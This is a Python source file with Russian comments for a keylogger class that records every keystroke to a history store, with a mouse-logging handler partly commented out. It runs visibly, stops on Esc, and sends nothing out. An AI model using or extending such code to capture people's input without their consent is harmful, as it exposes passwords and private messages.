""" Главный класс, который координирует работу всех других классов.
Он запускает и останавливает логирование, обрабатывает события
клавиатуры и мыши, и передает их в соответствующие классы для
отображения и сохранения. """
import keyboard


import keyboard
from Listener import Listener
from InputHistory import InputHistory
from TextDisplay import TextDisplay


class KeyLogger:
    def __init__(self):
        self.listener = Listener()
        self.input_history = InputHistory()
        self.text_display = TextDisplay()

    def run(self):
        """Запуск приложения и назначение комбинации клавиш для остановки"""
        print("Keylogger started. Press 'esc' to stop.")

        self.listener.start_listening(self.handle_keyboard_event) #, self.handle_mouse_event)

        keyboard.wait('esc')

        self.listener.stop_listening()
        print("Keylogger stopped.")

    def handle_keyboard_event(self, event):
        """Обработка события нажатия клавиши"""
        # text = f'Key {event.name} {event.event_type}'
        text = event.name
        # self.text_display.display_text(text)
        self.input_history.save_input(text)
        # print(text)

    def handle_mouse_event(self, event_type, x=None, y=None, button=None, pressed=None):
        """Обработка события от мыши"""
        if event_type == 'move':
            text = f'Mouse moved to ({x}, {y})'
        elif event_type == 'click':
            action = 'pressed' if pressed else 'released'
            text = f'Mouse {action} at ({x}, {y}) with {button}'
        elif event_type == 'scroll':
            dx, dy = button
            text = f'Mouse scrolled at ({x}, {y}) by ({button})'

        self.text_display.display_text(text)
        self.input_history.save_input(text)
        print(text)

    # def handle_mouse_event(self, *args):
    #     """ Обработка события от мыши """
    #     event_type = args[1] if len(args) > 1 else 'move'
    #     if event_type == 'move':
    #         x, y = args[0].x, args[0].y
    #         self.log += f'Mouse moved to ({x}, {y})\n'
    #         print(f'Mouse moved to ({x}, {y})')
    #     elif event_type == 'click':
    #         x, y = args[0].x, args[0].y
    #         button, pressed = args[1], args[2]
    #         action = 'pressed' if pressed else 'released'
    #         self.log += f'Mouse {action} at ({x}, {y}) with {button}\n'
    #         print(f'Mouse {action} at ({x}, {y}) with {button}')
    #     elif event_type == 'scroll':
    #         x, y = args[0].x, args[0].y
    #         dx, dy = args[1], args[2]
    #         self.log += f'Mouse scrolled at ({x}, {y}) by ({dx}, {dy})\n'
    #         print(f'Mouse scrolled at ({x}, {y}) by ({dx}, {dy})')